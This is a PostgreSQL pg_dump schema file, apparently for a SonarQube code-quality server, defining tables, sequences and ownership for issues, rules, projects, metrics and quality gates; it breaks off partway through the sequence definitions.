--
-- PostgreSQL database dump
--

-- Dumped from database version 9.6.5
-- Dumped by pg_dump version 10.0

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SET check_function_bodies = false;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner: 
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


SET search_path = public, pg_catalog;

SET default_tablespace = '';

SET default_with_oids = false;

--
-- Name: active_dashboards; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE active_dashboards (
    id integer NOT NULL,
    dashboard_id integer NOT NULL,
    user_id integer,
    order_index integer
);


ALTER TABLE active_dashboards OWNER TO sonar;

--
-- Name: active_dashboards_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE active_dashboards_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE active_dashboards_id_seq OWNER TO sonar;

--
-- Name: active_dashboards_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE active_dashboards_id_seq OWNED BY active_dashboards.id;


--
-- Name: active_rule_parameters; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE active_rule_parameters (
    id integer NOT NULL,
    active_rule_id integer NOT NULL,
    rules_parameter_id integer NOT NULL,
    value character varying(4000),
    rules_parameter_key character varying(128)
);


ALTER TABLE active_rule_parameters OWNER TO sonar;

--
-- Name: active_rule_parameters_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE active_rule_parameters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE active_rule_parameters_id_seq OWNER TO sonar;

--
-- Name: active_rule_parameters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE active_rule_parameters_id_seq OWNED BY active_rule_parameters.id;


--
-- Name: active_rules; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE active_rules (
    id integer NOT NULL,
    profile_id integer NOT NULL,
    rule_id integer NOT NULL,
    failure_level integer NOT NULL,
    inheritance character varying(10),
    created_at bigint,
    updated_at bigint
);


ALTER TABLE active_rules OWNER TO sonar;

--
-- Name: active_rules_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE active_rules_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE active_rules_id_seq OWNER TO sonar;

--
-- Name: active_rules_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE active_rules_id_seq OWNED BY active_rules.id;


--
-- Name: activities; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE activities (
    id integer NOT NULL,
    created_at timestamp without time zone NOT NULL,
    user_login character varying(255),
    data_field text,
    log_type character varying(50),
    log_action character varying(50),
    log_message character varying(4000),
    log_key character varying(250)
);


ALTER TABLE activities OWNER TO sonar;

--
-- Name: activities_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE activities_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE activities_id_seq OWNER TO sonar;

--
-- Name: activities_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE activities_id_seq OWNED BY activities.id;


--
-- Name: authors; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE authors (
    id integer NOT NULL,
    person_id integer NOT NULL,
    login character varying(255),
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE authors OWNER TO sonar;

--
-- Name: authors_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE authors_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE authors_id_seq OWNER TO sonar;

--
-- Name: authors_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE authors_id_seq OWNED BY authors.id;


--
-- Name: ce_activity; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE ce_activity (
    id integer NOT NULL,
    uuid character varying(40) NOT NULL,
    task_type character varying(15) NOT NULL,
    component_uuid character varying(40),
    status character varying(15) NOT NULL,
    is_last boolean NOT NULL,
    is_last_key character varying(55) NOT NULL,
    submitter_login character varying(255),
    submitted_at bigint NOT NULL,
    started_at bigint,
    executed_at bigint,
    created_at bigint NOT NULL,
    updated_at bigint NOT NULL,
    execution_time_ms bigint,
    snapshot_id bigint
);


ALTER TABLE ce_activity OWNER TO sonar;

--
-- Name: ce_activity_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE ce_activity_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE ce_activity_id_seq OWNER TO sonar;

--
-- Name: ce_activity_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE ce_activity_id_seq OWNED BY ce_activity.id;


--
-- Name: ce_queue; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE ce_queue (
    id integer NOT NULL,
    uuid character varying(40) NOT NULL,
    task_type character varying(15) NOT NULL,
    component_uuid character varying(40),
    status character varying(15) NOT NULL,
    submitter_login character varying(255),
    started_at bigint,
    created_at bigint NOT NULL,
    updated_at bigint NOT NULL
);


ALTER TABLE ce_queue OWNER TO sonar;

--
-- Name: ce_queue_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE ce_queue_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE ce_queue_id_seq OWNER TO sonar;

--
-- Name: ce_queue_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE ce_queue_id_seq OWNED BY ce_queue.id;


--
-- Name: dashboards; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE dashboards (
    id integer NOT NULL,
    user_id integer,
    name character varying(256),
    description character varying(1000),
    column_layout character varying(20),
    shared boolean,
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    is_global boolean
);


ALTER TABLE dashboards OWNER TO sonar;

--
-- Name: dashboards_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE dashboards_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE dashboards_id_seq OWNER TO sonar;

--
-- Name: dashboards_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE dashboards_id_seq OWNED BY dashboards.id;


--
-- Name: duplications_index; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE duplications_index (
    project_snapshot_id integer NOT NULL,
    snapshot_id integer NOT NULL,
    hash character varying(50) NOT NULL,
    index_in_file integer NOT NULL,
    start_line integer NOT NULL,
    end_line integer NOT NULL,
    id bigint NOT NULL
);


ALTER TABLE duplications_index OWNER TO sonar;

--
-- Name: duplications_index_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE duplications_index_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE duplications_index_id_seq OWNER TO sonar;

--
-- Name: duplications_index_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE duplications_index_id_seq OWNED BY duplications_index.id;


--
-- Name: events; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE events (
    id integer NOT NULL,
    name character varying(400),
    snapshot_id integer,
    category character varying(50),
    description character varying(4000),
    event_data character varying(4000),
    event_date bigint NOT NULL,
    created_at bigint NOT NULL,
    component_uuid character varying(50)
);


ALTER TABLE events OWNER TO sonar;

--
-- Name: events_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE events_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE events_id_seq OWNER TO sonar;

--
-- Name: events_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE events_id_seq OWNED BY events.id;


--
-- Name: file_sources; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE file_sources (
    id integer NOT NULL,
    project_uuid character varying(50) NOT NULL,
    file_uuid character varying(50) NOT NULL,
    line_hashes text,
    data_hash character varying(50),
    created_at bigint NOT NULL,
    updated_at bigint NOT NULL,
    src_hash character varying(50),
    binary_data bytea,
    data_type character varying(20),
    revision character varying(100)
);


ALTER TABLE file_sources OWNER TO sonar;

--
-- Name: file_sources_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE file_sources_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE file_sources_id_seq OWNER TO sonar;

--
-- Name: file_sources_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE file_sources_id_seq OWNED BY file_sources.id;


--
-- Name: group_roles; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE group_roles (
    id integer NOT NULL,
    group_id integer,
    resource_id integer,
    role character varying(64) NOT NULL
);


ALTER TABLE group_roles OWNER TO sonar;

--
-- Name: group_roles_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE group_roles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE group_roles_id_seq OWNER TO sonar;

--
-- Name: group_roles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE group_roles_id_seq OWNED BY group_roles.id;


--
-- Name: groups; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE groups (
    id integer NOT NULL,
    name character varying(500),
    description character varying(200),
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE groups OWNER TO sonar;

--
-- Name: groups_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE groups_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE groups_id_seq OWNER TO sonar;

--
-- Name: groups_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE groups_id_seq OWNED BY groups.id;


--
-- Name: groups_users; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE groups_users (
    user_id integer,
    group_id integer
);


ALTER TABLE groups_users OWNER TO sonar;

--
-- Name: issue_changes; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE issue_changes (
    id bigint NOT NULL,
    kee character varying(50),
    issue_key character varying(50) NOT NULL,
    user_login character varying(255),
    change_type character varying(20),
    change_data text,
    created_at bigint,
    updated_at bigint,
    issue_change_creation_date bigint
);


ALTER TABLE issue_changes OWNER TO sonar;

--
-- Name: issue_changes_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE issue_changes_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issue_changes_id_seq OWNER TO sonar;

--
-- Name: issue_changes_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE issue_changes_id_seq OWNED BY issue_changes.id;


--
-- Name: issue_filter_favourites; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE issue_filter_favourites (
    id integer NOT NULL,
    user_login character varying(255) NOT NULL,
    issue_filter_id integer NOT NULL,
    created_at timestamp without time zone
);


ALTER TABLE issue_filter_favourites OWNER TO sonar;

--
-- Name: issue_filter_favourites_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE issue_filter_favourites_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issue_filter_favourites_id_seq OWNER TO sonar;

--
-- Name: issue_filter_favourites_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE issue_filter_favourites_id_seq OWNED BY issue_filter_favourites.id;


--
-- Name: issue_filters; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE issue_filters (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    user_login character varying(255),
    shared boolean DEFAULT false NOT NULL,
    description character varying(4000),
    data text,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE issue_filters OWNER TO sonar;

--
-- Name: issue_filters_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE issue_filters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issue_filters_id_seq OWNER TO sonar;

--
-- Name: issue_filters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE issue_filters_id_seq OWNED BY issue_filters.id;


--
-- Name: issues; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE issues (
    id bigint NOT NULL,
    kee character varying(50) NOT NULL,
    rule_id integer,
    severity character varying(10),
    manual_severity boolean NOT NULL,
    message character varying(4000),
    line integer,
    gap numeric(30,20),
    status character varying(20),
    resolution character varying(20),
    checksum character varying(1000),
    reporter character varying(255),
    assignee character varying(255),
    author_login character varying(255),
    action_plan_key character varying(50),
    issue_attributes character varying(4000),
    effort integer,
    created_at bigint,
    updated_at bigint,
    issue_creation_date bigint,
    issue_update_date bigint,
    issue_close_date bigint,
    tags character varying(4000),
    component_uuid character varying(50),
    project_uuid character varying(50),
    locations bytea,
    issue_type smallint
);


ALTER TABLE issues OWNER TO sonar;

--
-- Name: issues_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE issues_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issues_id_seq OWNER TO sonar;

--
-- Name: issues_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE issues_id_seq OWNED BY issues.id;


--
-- Name: loaded_templates; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE loaded_templates (
    id integer NOT NULL,
    kee character varying(200),
    template_type character varying(15)
);


ALTER TABLE loaded_templates OWNER TO sonar;

--
-- Name: loaded_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE loaded_templates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE loaded_templates_id_seq OWNER TO sonar;

--
-- Name: loaded_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE loaded_templates_id_seq OWNED BY loaded_templates.id;


--
-- Name: manual_measures; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE manual_measures (
    id bigint NOT NULL,
    metric_id integer NOT NULL,
    value numeric(38,20),
    text_value character varying(4000),
    user_login character varying(255),
    description character varying(4000),
    created_at bigint,
    updated_at bigint,
    component_uuid character varying(50)
);


ALTER TABLE manual_measures OWNER TO sonar;

--
-- Name: manual_measures_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE manual_measures_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE manual_measures_id_seq OWNER TO sonar;

--
-- Name: manual_measures_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE manual_measures_id_seq OWNED BY manual_measures.id;


--
-- Name: measure_filter_favourites; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE measure_filter_favourites (
    id integer NOT NULL,
    user_id integer NOT NULL,
    measure_filter_id integer NOT NULL,
    created_at timestamp without time zone
);


ALTER TABLE measure_filter_favourites OWNER TO sonar;

--
-- Name: measure_filter_favourites_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE measure_filter_favourites_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE measure_filter_favourites_id_seq OWNER TO sonar;

--
-- Name: measure_filter_favourites_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE measure_filter_favourites_id_seq OWNED BY measure_filter_favourites.id;


--
-- Name: measure_filters; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE measure_filters (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    user_id integer,
    shared boolean DEFAULT false NOT NULL,
    description character varying(4000),
    data text,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE measure_filters OWNER TO sonar;

--
-- Name: measure_filters_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE measure_filters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE measure_filters_id_seq OWNER TO sonar;

--
-- Name: measure_filters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE measure_filters_id_seq OWNED BY measure_filters.id;


--
-- Name: metrics; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE metrics (
    id integer NOT NULL,
    name character varying(64) NOT NULL,
    description character varying(255),
    direction integer DEFAULT 0 NOT NULL,
    domain character varying(64),
    short_name character varying(64),
    qualitative boolean DEFAULT false NOT NULL,
    val_type character varying(8),
    user_managed boolean DEFAULT false,
    enabled boolean DEFAULT true,
    worst_value numeric(38,20),
    best_value numeric(38,20),
    optimized_best_value boolean,
    hidden boolean,
    delete_historical_data boolean,
    decimal_scale integer
);


ALTER TABLE metrics OWNER TO sonar;

--
-- Name: metrics_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE metrics_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE metrics_id_seq OWNER TO sonar;

--
-- Name: metrics_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE metrics_id_seq OWNED BY metrics.id;


--
-- Name: notifications; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE notifications (
    id integer NOT NULL,
    data bytea
);


ALTER TABLE notifications OWNER TO sonar;

--
-- Name: notifications_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE notifications_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE notifications_id_seq OWNER TO sonar;

--
-- Name: notifications_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE notifications_id_seq OWNED BY notifications.id;


--
-- Name: perm_templates_groups; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE perm_templates_groups (
    id integer NOT NULL,
    group_id integer,
    template_id integer NOT NULL,
    permission_reference character varying(64) NOT NULL,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE perm_templates_groups OWNER TO sonar;

--
-- Name: perm_templates_groups_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE perm_templates_groups_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE perm_templates_groups_id_seq OWNER TO sonar;

--
-- Name: perm_templates_groups_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE perm_templates_groups_id_seq OWNED BY perm_templates_groups.id;


--
-- Name: perm_templates_users; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE perm_templates_users (
    id integer NOT NULL,
    user_id integer NOT NULL,
    template_id integer NOT NULL,
    permission_reference character varying(64) NOT NULL,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE perm_templates_users OWNER TO sonar;

--
-- Name: perm_templates_users_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE perm_templates_users_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE perm_templates_users_id_seq OWNER TO sonar;

--
-- Name: perm_templates_users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE perm_templates_users_id_seq OWNED BY perm_templates_users.id;


--
-- Name: permission_templates; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE permission_templates (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    kee character varying(100) NOT NULL,
    description character varying(4000),
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    key_pattern character varying(500)
);


ALTER TABLE permission_templates OWNER TO sonar;

--
-- Name: permission_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE permission_templates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE permission_templates_id_seq OWNER TO sonar;

--
-- Name: permission_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE permission_templates_id_seq OWNED BY permission_templates.id;


--
-- Name: project_links; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE project_links (
    id integer NOT NULL,
    link_type character varying(20),
    name character varying(128),
    href character varying(2048) NOT NULL,
    component_uuid character varying(50)
);


ALTER TABLE project_links OWNER TO sonar;

--
-- Name: project_links_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE project_links_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE project_links_id_seq OWNER TO sonar;

--
-- Name: project_links_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE project_links_id_seq OWNED BY project_links.id;


--
-- Name: project_measures; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE project_measures (
    id bigint NOT NULL,
    value numeric(38,20),
    metric_id integer NOT NULL,
    snapshot_id integer,
    rule_id integer,
    rules_category_id integer,
    text_value character varying(4000),
    tendency integer,
    measure_date timestamp without time zone,
    project_id integer,
    alert_status character varying(5),
    alert_text character varying(4000),
    url character varying(2000),
    description character varying(4000),
    rule_priority integer,
    characteristic_id integer,
    person_id integer,
    variation_value_1 numeric(38,20),
    variation_value_2 numeric(38,20),
    variation_value_3 numeric(38,20),
    variation_value_4 numeric(38,20),
    variation_value_5 numeric(38,20),
    measure_data bytea
);


ALTER TABLE project_measures OWNER TO sonar;

--
-- Name: project_measures_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE project_measures_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE project_measures_id_seq OWNER TO sonar;

--
-- Name: project_measures_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE project_measures_id_seq OWNED BY project_measures.id;


--
-- Name: project_qprofiles; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE project_qprofiles (
    id integer NOT NULL,
    project_uuid character varying(50) NOT NULL,
    profile_key character varying(255) NOT NULL
);


ALTER TABLE project_qprofiles OWNER TO sonar;

--
-- Name: project_qprofiles_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE project_qprofiles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE project_qprofiles_id_seq OWNER TO sonar;

--
-- Name: project_qprofiles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE project_qprofiles_id_seq OWNED BY project_qprofiles.id;


--
-- Name: projects; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE projects (
    id integer NOT NULL,
    name character varying(2000),
    description character varying(2000),
    enabled boolean DEFAULT true NOT NULL,
    scope character varying(3),
    qualifier character varying(10),
    kee character varying(400),
    root_id integer,
    language character varying(20),
    copy_resource_id integer,
    long_name character varying(2000),
    person_id integer,
    created_at timestamp without time zone,
    path character varying(2000),
    deprecated_kee character varying(400),
    uuid character varying(50),
    project_uuid character varying(50),
    module_uuid character varying(50),
    module_uuid_path character varying(4000),
    authorization_updated_at bigint
);


ALTER TABLE projects OWNER TO sonar;

--
-- Name: projects_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE projects_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE projects_id_seq OWNER TO sonar;

--
-- Name: projects_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE projects_id_seq OWNED BY projects.id;


--
-- Name: properties; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE properties (
    id integer NOT NULL,
    prop_key character varying(512),
    resource_id integer,
    text_value text,
    user_id integer
);


ALTER TABLE properties OWNER TO sonar;

--
-- Name: properties_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE properties_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE properties_id_seq OWNER TO sonar;

--
-- Name: properties_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE properties_id_seq OWNED BY properties.id;


--
-- Name: quality_gate_conditions; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE quality_gate_conditions (
    id integer NOT NULL,
    qgate_id integer,
    metric_id integer,
    period integer,
    operator character varying(3),
    value_error character varying(64),
    value_warning character varying(64),
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE quality_gate_conditions OWNER TO sonar;

--
-- Name: quality_gate_conditions_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE quality_gate_conditions_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE quality_gate_conditions_id_seq OWNER TO sonar;

--
-- Name: quality_gate_conditions_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE quality_gate_conditions_id_seq OWNED BY quality_gate_conditions.id;


--
-- Name: quality_gates; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE quality_gates (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE quality_gates OWNER TO sonar;

--
-- Name: quality_gates_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE quality_gates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE quality_gates_id_seq OWNER TO sonar;

--
-- Name: quality_gates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE quality_gates_id_seq OWNED BY quality_gates.id;


--
-- Name: resource_index; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE resource_index (
    id integer NOT NULL,
    kee character varying(400) NOT NULL,
    "position" integer NOT NULL,
    name_size integer NOT NULL,
    resource_id integer NOT NULL,
    root_project_id integer NOT NULL,
    qualifier character varying(10) NOT NULL
);


ALTER TABLE resource_index OWNER TO sonar;

--
-- Name: resource_index_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE resource_index_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE resource_index_id_seq OWNER TO sonar;

--
-- Name: resource_index_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE resource_index_id_seq OWNED BY resource_index.id;


--
-- Name: rules; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE rules (
    id integer NOT NULL,
    name character varying(200),
    plugin_rule_key character varying(200) NOT NULL,
    plugin_config_key character varying(200),
    plugin_name character varying(255) NOT NULL,
    description text,
    priority integer,
    template_id integer,
    status character varying(40),
    language character varying(20),
    note_created_at timestamp without time zone,
    note_updated_at timestamp without time zone,
    note_user_login character varying(255),
    note_data text,
    remediation_function character varying(20),
    def_remediation_function character varying(20),
    remediation_gap_mult character varying(20),
    def_remediation_gap_mult character varying(20),
    remediation_base_effort character varying(20),
    def_remediation_base_effort character varying(20),
    gap_description character varying(4000),
    tags character varying(4000),
    system_tags character varying(4000),
    is_template boolean DEFAULT false NOT NULL,
    description_format character varying(20),
    created_at bigint,
    updated_at bigint,
    rule_type smallint
);


ALTER TABLE rules OWNER TO sonar;

--
-- Name: rules_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

